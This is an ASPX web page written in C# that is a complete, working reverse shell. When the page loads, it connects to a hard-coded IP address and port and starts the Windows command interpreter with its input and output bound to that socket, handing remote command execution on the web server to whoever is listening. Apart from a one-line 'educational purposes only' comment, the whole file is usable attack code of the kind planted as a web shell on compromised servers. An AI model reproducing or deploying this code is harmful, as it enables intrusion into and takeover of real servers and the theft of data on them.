<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">

    // Simple reverse shell for ASPX. For educational purposes only!

    const string IP = "192.168.129.210";
    const ushort PORT = 1234;

    const uint CREATE_NO_WINDOW = 0x08000000;
    const Int32 Startf_UseStdHandles = 0x00000100;

    [StructLayout(LayoutKind.Sequential)]
    public struct sockaddr_in
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES {
      public int    Length;
      public IntPtr lpSecurityDescriptor;
      public bool   bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    static extern bool CreateProcess(
       string lpApplicationName,
       string lpCommandLine,
       ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes,
       bool bInheritHandles,
       uint dwCreationFlags,
       IntPtr lpEnvironment,
       string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo,
                                            [In] uint group,
                                            [In] int flags
                                            );


    [DllImport("ws2_32.dll")]
    public static extern int connect(IntPtr s, ref sockaddr_in addr, int addrsize);

    [DllImport("ws2_32.dll")]
    public static extern ushort htons(ushort hostshort);

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi)]
    public static extern uint inet_addr(string cp);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int closesocket(IntPtr s);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    static extern Int32 WSAGetLastError();

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr socket;
        SpawnShell(IP, PORT, out socket);

        if( socket != IntPtr.Zero ) {
            closesocket(socket);
        }
    }

    protected void SpawnShell(string IP, ushort PORT, out IntPtr socket)
    {
        int error;
        socket = IntPtr.Zero;

        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);
        error = WSAGetLastError();

        if( error != 0 ) {
            Response.Write("[-] WSASocket failed with error code: " + error + "\n");
            return;
        }

        sockaddr_in sockinfo = new sockaddr_in();
        sockinfo.sin_family = (short)2;
        sockinfo.sin_addr = inet_addr(IP);
        sockinfo.sin_port = (short)htons(PORT);

        if( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
            error = WSAGetLastError();
            Response.Write("[-] connect failed with error code: " + error + "\n");
            return;
        }

        string command = Environment.GetEnvironmentVariable("comspec");
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        STARTUPINFO si = new STARTUPINFO();
        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
        sa.Length = Marshal.SizeOf(sa);

        si.dwFlags = Startf_UseStdHandles;
        si.hStdInput = socket;
        si.hStdOutput = socket;
        si.hStdError = socket;

        if( !CreateProcess(command, "", ref sa, ref sa, true, CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi) ) {
            error = Marshal.GetLastWin32Error();
            Response.Write("[-] CreateProcess failed with error: " + error + "\n");
            return;
        }

        Response.Write("[+] Process Created.\n");
    }
</script>
